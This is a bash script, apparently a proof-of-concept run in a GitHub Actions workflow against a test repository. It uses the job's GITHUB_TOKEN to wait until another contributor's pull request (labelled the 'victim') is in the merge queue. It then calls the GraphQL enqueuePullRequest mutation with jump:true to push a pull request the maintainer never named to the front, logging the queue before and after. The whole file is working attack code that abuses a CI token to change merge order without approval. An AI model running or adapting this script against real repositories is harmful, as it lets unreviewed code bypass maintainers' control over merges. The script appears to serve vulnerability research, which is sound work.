#!/usr/bin/env bash
set -uo pipefail
if [ -z "${GITHUB_TOKEN:-}" ]; then
  echo "JQ|VOID|GITHUB_TOKEN-EMPTY-IN-ENV - every result below is meaningless"; echo "JQ|DONE"; exit 0
fi
echo "JQ|EVENT|${GITHUB_EVENT_NAME:-?}|REF|${GITHUB_REF:-?}|RUN|${GITHUB_RUN_ID:-?}"
TARGET=$(cat .github/scripts/TARGET_PR_NODE)
SELF=$(cat .github/scripts/SELF_PR_NUMBER)
echo "JQ|TARGET-NODE|${TARGET}|SELF-PR|${SELF}"
gq () { curl -s -H "Authorization: Bearer ${GITHUB_TOKEN}" -H 'Content-Type: application/json' \
        -d "$1" https://api.github.com/graphql; }
QUEUE='{"query":"query{repository(owner:\"kovac-labs\",name:\"zz-mq-tok-1027\"){mergeQueue(branch:\"jmp3\"){entries(first:10){nodes{position state headCommit{oid} pullRequest{number}}}}}}"}'
# wait for a VICTIM entry (any entry whose PR number is not ours) before jumping
for i in $(seq 1 24); do
  Q=$(gq "$QUEUE")
  N=$(echo "$Q" | python3 -c "
import sys,json
d=json.load(sys.stdin)
ns=(((d.get('data') or {}).get('repository') or {}).get('mergeQueue') or {}).get('entries',{}).get('nodes') or []
print(len(ns)); print('|'.join('%s:%s:%s:%s'%(e['pullRequest']['number'],e['position'],e['state'],(e['headCommit'] or {}).get('oid','')[:12]) for e in ns))
" 2>/dev/null)
  CNT=$(echo "$N" | head -1); ROWS=$(echo "$N" | tail -1)
  echo "JQ|WAIT|i=${i}|entries=${CNT}|${ROWS}"
  if [ "${CNT:-0}" -ge 2 ]; then break; fi
  sleep 10
done
echo "JQ|PRE-QUEUE|${ROWS}"
# THE ARM: jump-enqueue a pull request the maintainer never mentioned, to the FRONT of a queue
# that already contains the victim.
M="{\"query\":\"mutation{enqueuePullRequest(input:{pullRequestId:\\\"${TARGET}\\\",jump:true}){mergeQueueEntry{position state enqueuer{login} pullRequest{number}}}}\"}"
R=$(gq "$M")
echo "JQ|JUMP-ENQUEUE|$(echo "$R" | tr -d '\n' | head -c 500)"
sleep 25
Q=$(gq "$QUEUE")
echo "JQ|POST-QUEUE|$(echo "$Q" | python3 -c "
import sys,json
d=json.load(sys.stdin)
ns=(((d.get('data') or {}).get('repository') or {}).get('mergeQueue') or {}).get('entries',{}).get('nodes') or []
print('|'.join('%s:%s:%s:%s'%(e['pullRequest']['number'],e['position'],e['state'],(e['headCommit'] or {}).get('oid','')[:12]) for e in ns))
" 2>/dev/null)"
echo "JQ|DONE"
